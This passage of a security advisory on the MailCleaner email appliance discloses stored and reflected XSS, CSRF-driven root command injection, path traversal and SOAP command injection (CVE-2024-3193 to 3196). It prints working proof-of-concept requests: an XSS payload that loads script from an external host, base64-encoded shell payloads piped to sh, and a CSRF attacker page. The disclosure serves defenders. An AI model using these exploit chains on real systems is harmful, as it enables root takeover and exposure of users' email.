the payload within the sender’s email address as can be seen in Listing 3. A test string
called “Generic Test for  Unsolicited Bulk Email” can be used as email body to ensure
that the attacker’s email message will be classified as spam by MailCleaner.5 A proof of
concept  for  the attack can  be  seen  in  Listing  3.  Since  the message will  be  moved  to
quarantine and no delivery attempt to the target mail server will be made it does not have
to originate from a legitimate mail server.

1

2

3

swaks --to 'test@mod0.local' --from '"<script/src=//short.de>"@mod0.eu' \

--from test@mod0.eu --server mailcleaner.local \

--body 'XJS*C4JDBQADN1.NSBN3*2IDNEN*GTUBE-STANDARD-ANTI-UBE-TEST-EMAIL*C.34X'

Listing 3 – Stored XSS payload in email recipient sent to MailCleaner.

5 https://web.archive.org/web/20240322092558/https://spamassassin.apache.org/gtube/

Public

 2024-04-29

MailCleaner (MZ-24-01 / 1.0)

11

Once an administrator visits the formerly described dashboard pages, the XSS payload
will be triggered and the JavaScript from the external domain will be executed.

Figure 6 – The stored XSS payload gets triggered.

The  impact  of  the  XSS  attack  on  the  administrative  dashboard  is  that  it  significantly
undermines the confidentiality and availability of email communications. Specifically, an
attacker  gains  unauthorized access  to  emails  and  could  potentially expose contained
sensitive information. Moreover, such vulnerabilities could be leveraged to shut down
the  email  system  entirely,  denying  access  to  legitimate  users  and  disrupting  email
availability.  In  addition,  an  attacker  can  perform  any  action  that  an  authorized
administrator can, compromising the system's integrity and security.

Public

 2024-04-29

MailCleaner (MZ-24-01 / 1.0)

12

3 Findings – Web Service

This  chapter  describes  all  identified  findings  of  the  web  interfaces  available  at
https://<mailcleaner domain>/admin and https://<mailcleaner domain>/.

3.1 CSRF-based OS Command Injection on Multiple

Endpoints

Class

CWE-78: Improper Neutralization of Special Elements used in
an OS Command

CVSS Rating

■ 8.8 High CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H

Component

Admin Interface

Affected
Endpoints

▪
▪
▪

/admin/monitorreporting/search
/admin/domain/clearsmtpauthcache
/admin/monitorlogs/view

CVE-ID

CVE-2024-3193

Summary

Several administrator endpoints allow command injection as root user via a specifically
prepared  URL.  To  exploit  this  issue  an  attacker  needs  to  be  either  authenticated  as
administrator  or  lure  a  logged-in  administrator  on  an  attacker-controlled  website.  By
abusing this vulnerability an attacker can compromise the entire system.

Requirements

The vulnerability can be exploited if any of the following requirements is met:

▪  A logged-in administrator visits an attacker-controlled website or clicks an

attacker-controlled link

▪  An attacker has authenticated access to the admin dashboard

Details

MailCleaner provides several endpoints to admin users which construct OS commands
based on user input from a URL. Due to missing sanitization within the web application,
attackers  can  run  arbitrary  OS  commands  as  root  user.  As  the  command  injection  is
happening via an URL, the attacker does not have to be authenticated as administrator
but can use a CSRF based attack from a website they control or send an administrator a

Public

 2024-04-29

MailCleaner (MZ-24-01 / 1.0)

13

specifically  prepared  link.  Once  the  vicitm  visits  the  malicious  website,  the  exploit  is
triggered automatically.

MailCleaner provides an endpoint to search through reporting statistics for admin users.
The endpoint has several parameters for customized queries. One of the parameters is
susceptible to OS command injections. For successful exploitation the payload must first
terminate  the  search  string  by  passing  an  apostrophe  followed  by  the  command
wrapped in backticks and another apostrophe (see Listing 4).

1

GET

/admin/monitorreporting/search/search/a'`id`'/domain//td/12/tm/3/fd/8/fm/3/sort/msgs/t

op/10/submit/1 HTTP/1.1

Host: mailcleaner.local

Cookie: MCSESS=89742q8kfb0j59ic1ivo815p33

Connection: close

2

3

4

Listing 4 - OS command injection on monitor reporting search endpoint.

As  a  proof  of  concept,  a  payload  was  constructed  by  encoding  the  command

id>/tmp/mod0 with base64, wrapping it into echo <base64> | base64 -d | sh and
applying URL encoding as seen in Listing 5.

1

a'`echo%20aWQ%2BL3RtcC9tb2QwCg==|base64%20-d|sh`'

Listing 5 - Final OS command injection payload for reporting endpoint.

Execution of the command can be verified by inspecting the file system. (Figure 7)

Figure 7 - Verifying command execution via reporting endpoint.

Command  injections  in  a  GET  request  are  particularly  dangerous  as  they  can  be
triggered  from  an  attacker-controlled  webpage  through  Cross-Site  Request  Forgery
(CSRF). CSRF is a type of attack that forces an end user to execute unwanted actions
on a web application in which they're currently authenticated. It's based on the principle
that if a user is authenticated to a site, their browser automatically includes credentials
like cookies to the site. An attacker's webpage can then use JavaScript to send a GET
request with malicious parameters. This is straightforward  and the only required user
interaction  is  that  the user  is  logged-in  on  the  administrator  dashboard and  visits  the
attacker’s website. An exemplary proof of concept can be found in Listing 6.

Public

 2024-04-29

MailCleaner (MZ-24-01 / 1.0)

14

1

2

3

Welcome to my attacker page!

<script>

document.location =

"https://mailcleaner/admin/monitorreporting/search/search/a'PAYLOAD'/domain//td/12/tm/

3/fd/8/fm/3/sort/msgs/top/10/submit/1"

4

</script>

Listing 6 – CSRF-based OS command injection.

In addition to this one-click OS command injection, there are two injections which need
two steps to be exploited:

MailCleaner provides an endpoint to admin users to clear smtp auth cache files. These
files are located at /var/mailcleaner/spool/tmp/exim_stage1/auth_cache/. The endpoint
first constructs a path based on the cache name provided by the user and the expected
file location. In a second step it is verified whether the constructed path exists and lastly
an  OS  command  is  built  using  the  file  path.  The  path  string  is  then  executed  without
performing any sanitization.

It is not possible to directly inject OS commands as the constructed file path is verified
and must exist on the file system. However, by combining this with another vulnerability
which allows arbitrary file write (see Finding 3.3) attackers are able to execute arbitrary
OS commands.

To facilitate this attack a valid file name has to be constructed which, when injected into
the command line, will be evaluated as a command. As a proof of concept, the command

id>/tmp/mod0  was

base64

encoded

and  wrapped

into

$(echo

aWQ+L3RtcC9tb2QwCg==|base64 -d|sh). To pass this payload as a parameter to the
web  server  it  is  also  URL  encoded.  Listing  7  illustrates  the  final  request  to  create  a
malicious file which uses the technique described in Finding 3.3

1

2

3

4

GET
/admin/index/todaypie?c=1&t=/../../var/mailcleaner/spool/tmp/exim_stage1/auth_cache/
%24%28echo%20aWQ%2BL3RtcC9tb2QwCg%3D%3D%7Cbase64%20-d%7Csh%29.db HTTP/1.1

Host: mailcleaner.local

Cookie: MCSESS=89742q8kfb0j59ic1ivo815p33

Connection: close

Listing 7 - Creation of malicious file using vulnerability from finding 3.3.

Public

 2024-04-29

MailCleaner (MZ-24-01 / 1.0)

15

Listing  files  in  the  corresponding  directory  shows  that  the  file  has  been  successfully
created (see Figure 8).

Figure 8 - Malicious file created by todaypie endpoint.

Once the malicious file is in place the command can be triggered by sending a request
to the clearsmtpauthcache endpoint. The same payload that was used for file creation
in the previous step is used as name parameter (see Listing 8)

1

GET

/admin/domain/clearsmtpauthcache?name=%24%28echo%20aWQ%2BL3RtcC9tb2QwCg%3D%3D%7Cbase64

%20-d%7Csh%29 HTTP/1.1

Host: mailcleaner.local

Cookie: MCSESS=89742q8kfb0j59ic1ivo815p33

Connection: close

2

3

4

Listing 8 - Triggering command execution on clearsmtpauthcache endpoint.

Execution of the command can be verified by inspecting the file system (see Figure 9).

Figure 9 - Verifying command execution via clearsmtpauthcache endpoint.

Finally, MailCleaner provides an endpoint to admin users to view log files. Specific log
files are requested by utilizing the f URL parameter. The endpoint first constructs a path
based on the file name provided by the user and the expected file location. In a second
step it is verified whether the constructed path exists and lastly an OS command is built
using the file path. The path string is then executed without performing any sanitization.

Public

 2024-04-29

MailCleaner (MZ-24-01 / 1.0)

16

Similarly to the previous endpoint it is not possible to directly inject OS commands as
the constructed file path is verified and must exist on the file system. A malicious file
can be created in a similar fashion. Once the malicious file is in place the command can
be triggered by sending a request to the monitorlogs/view endpoint. The same payload
is used as name parameter as for file creation in the previous step (see Listing 9).

1

2

3

4

5

GET /admin/monitorlogs/view?f=1-../../../../-/tmp/%24%28id%3Emod0%29 HTTP/1.1

Host: mailcleaner.local

X-Requested-With: XMLHttpRequest

Cookie: MCSESS=89742q8kfb0j59ic1ivo815p33

Connection: close

Listing 9 - Triggering command execution on monitorlogs/view endpoint.

Attackers  exploiting  one  of  the  endpoints  can  execute  arbitrary  commands  with  root
privileges.  This  allows  them  to  compromise  the  entire  system,  to  gain  unrestricted
access  to  sensitive  data  (e.g.,  the  emails  processed  by  the  system),  to  manipulate
system configurations, and to launch further attacks with elevated permissions, posing
a significant security risk to the server and its users.

Public

 2024-04-29

MailCleaner (MZ-24-01 / 1.0)

17

3.2 Reflected XSS on Multiple Endpoints

Class

CWE-79: Improper Neutralization of Input During Web Page
Generation

CVSS Rating

■ 8.8 High CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:H

Component

Admin Interface

Affected
Endpoints

▪
▪

/uwwlist.php
/admin/monitorlogs/view

CVE-ID

CVE-2024-3194

Summary

Reflected  Cross-Site-Scripting  vulnerabilities  which  were  identified  on  two  endpoints
allow  an  attacker  to  inject  malicious  JavaScript  for  session  hijacking,  data  theft,  or
unauthorized  actions  on  behalf  of  the  victim  if  the  user  was  tricked  into  clicking  a
specially crafted link.

Requirements

An  authenticated  user  clicks  on  a  link  crafted  by  the  attacker  or  visits  an  attacker-
controlled page.

Details

MailCleaner provides an endpoint to admin users for inspecting log files. Specific log
files are requested by utilizing the f URL parameter which adheres to a particular format.
The  webserver  constructs  a  file  path  based  on  the  user  input  and  displays  an  error
message if the requested file cannot be located (see Figure 10).

Public

 2024-04-29

MailCleaner (MZ-24-01 / 1.0)

18

Figure 10 - Error message displayed on the monitor logs endpoint if the requested file cannot be located.

The users’ input passed via URL parameter is reflected on the rendered web page. Due
to  missing  sanitization,  it  is  possible  to  inject  arbitrary  content  into  the  site  including
JavaScript  code.  As  a  proof  of  concept,  a  message  box  is  displayed  by  using  the
payload:

1

f=1-a-%27;alert(“mod0”);//

Listing 10 - XSS Payload to display a message box.

Figure 11 – Successful execution of XSS payload sent to monitor logs view endpoint.

Public

 2024-04-29

MailCleaner (MZ-24-01 / 1.0)

19

A similar reflected XSS vulnerability was found in the uwwlist.php endpoint. This proof
of concept code also displays a message box:

1

a=%3Cscript%3Ealert(1)%3C/script%3E

Listing 11 - XSS Payload to display a message box.

Figure 12 - Successful execution of XSS payload sent to uwwlist.php endpoint.

If an attacker gains control over a script that was executed in the victim's browser, they
can usually completely compromise that user. This allows them to perform any action,
to  view  or  modify  information  accessible  to  the  user,  and  to  initiate  interactions  with
other users. They can for example carry out malicious actions within the application that
appear to originate from the victim.

Public

 2024-04-29

MailCleaner (MZ-24-01 / 1.0)

20

3.3 Authenticated Path Traversal on Multiple

Endpoints

Class

CWE-22: Improper Limitation of a Pathname to a Restricted
Directory

CVSS Rating

■ 4.7 Medium CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:L/I:L/A:L

Component

Admin Interface

Affected
Endpoints

▪
▪
▪

/admin/monitorlogs/download (file read)
/admin/monitorlogs/view (file read)
/admin/index/todaypie (file write without control over
content)

CVE-ID

CVE-2024-3195

Summary

There  are  multiple  path  traversal  vulnerabilities  in  several  endpoints,  which  can  be
exploited to navigate outside of the intended directory structure. This allows an attacker
to  access  or  create  arbitrary  files  on  the  host  and  therefore  compromise  the
confidentiality of the system.

Requirements

An attacker needs authenticated access to the admin web interface.

Details

MailCleaner provides several endpoints to admin users which construct file paths based
on user input. Due to missing checks of the resulting file paths, attackers can navigate
outside of the intended directory structure and download, view or write arbitrary files.

The /admin/monitorlogs/download endpoint is used to download log files. Specific log
files are requested by utilizing the f URL parameter which adheres to a particular format.
As depicted in Figure 13 the endpoint can be abused to download arbitrary files.

Public

 2024-04-29

MailCleaner (MZ-24-01 / 1.0)

21

Figure 13 - Abusing path traversal on /admin/monitorlogs/download endpoint to display /etc/shadow.

Similarly, the /admin/monitorlogs/view is responsible for displaying log files. Specific log
files are again requested by utilizing the f URL parameter. In the same fashion as on the
download endpoint arbitrary files can be viewed.

Figure 14 - Abusing path traversal on /admin/monitorlogs/view endpoint to display /etc/shadow.

Lastly  MailCleaner  provides  functionality  to  render  pie  charts  displaying  statistics.
Presumably  to  reduce  load  on  the  system  the  endpoint  providing  these  pie  charts
supports a caching mechanism which stores data  that is used to generate the charts.
Cache file paths are formulated using several variables, including one provided by the
user, known as "type" (t URL parameter). This parameter is vulnerable to path traversal.
(see Listing 12)

1

2

3

4

GET /admin/index/todaypie?c=1&t=/../../tmp/mod0 HTTP/1.1

Host: mailcleaner.local

Cookie: MCSESS=89742q8kfb0j59ic1ivo815p33

Connection: close

Listing 12 - Request to todaypie endpoint using path traversal.

Public

 2024-04-29

MailCleaner (MZ-24-01 / 1.0)

22

As illustrated in Figure 15 the cache file was successfully created.

Figure 15 - File created by the todaypie endpoint.

Path traversal vulnerabilities allow attackers to navigate outside the intended directory
structure, potentially accessing sensitive system files or compromising the integrity and
security of the entire system.

Public

 2024-04-29

MailCleaner (MZ-24-01 / 1.0)

23

4 Findings – SOAP Service

This chapter describes all identified findings of the internal soap services available at
http://localhost:5132/mailcleaner.php and http://localhost:5132/soap/index.php.

4.1 Unauthenticated OS Command Injection on Local

SOAP Endpoints

Class

CWE-78: Improper Neutralization of Special Elements used in
an OS Command

CVSS Rating

■ 6.7 Medium CVSS:3.1/AV:L/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H

Component

Internal SOAP Services

Affected
Endpoints

▪  getStats
▪  Services_silentDump
▪  Services_stopStartMTA
▪  Config_saveDateTime
▪  Config_hostid
▪  Logs_StartGetStat
▪  dumpConfiguration

CVE-ID

CVE-2024-3196

Summary

Multiple  unauthenticated  SOAP  endpoints  are  vulnerable  to  OS  command  injections,
enabling attackers with network access to the service to execute arbitrary commands
as root on the system. Apart from providing low privileged users with a way to escalate
their privileges, this issue also allows attackers to compromise all cluster members in
case of a cluster setup.

Requirements

An attacker needs network access to port 5132 on a MailCleaner host.

Details

MailCleaner  offers  unauthenticated  SOAP  services  utilized  by  several  components  of
the MailCleaner appliance. In a cluster setup these endpoints are exposed to all cluster
members and therefore the internal network.

Public

 2024-04-29

MailCleaner (MZ-24-01 / 1.0)

24

Multiple  SOAP  endpoints  generate  OS  commands  with  client  input,  which  are
subsequently executed without undergoing any sanitization process.

Listing 13 demonstrates successful exploitation of the vulnerability as an example for
the getStats endpoint.

1
2
3
4
5
6
7

8
9
10
11
12
13

POST /mailcleaner.php/getStats HTTP/1.1
Host: mailcleaner.local:5132
Content-Type: text/xml; charset=utf-8
Content-Length: 560

<?xml version="1.0" encoding="UTF-8"?>
<env:Envelope xmlns:env="http://www.w3.org/2003/05/soap-envelope"
xmlns:ns1="http://127.0.0.1:5132/mailcleaner.php"
xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:ns2="http://xml.apache.org/xml-
soap" xmlns:enc="http://www.w3.org/2003/05/soap-encoding">
  <env:Body>
    <ns1:getStats env:encodingStyle="http://www.w3.org/2003/05/soap-encoding">
      <what xsi:type="xsd:string">`touch /tmp/abc`</what>
    </ns1:getStats>
  </env:Body>
</env:Envelope>

Listing 13 - Exploiting command injection vulnerability in getStats endpoint.

As the SOAP services are running as root, attackers who exploit the vulnerability can
execute arbitrary commands  with  root  privileges.  Apart  from  providing  low  privileged
users  with  a  way  to  escalate  their  privileges,  this  issue  also  allows  attackers  to
compromise all cluster members in case of a cluster setup leading to unrestricted control
of the entire appliance.

Public

 2024-04-29


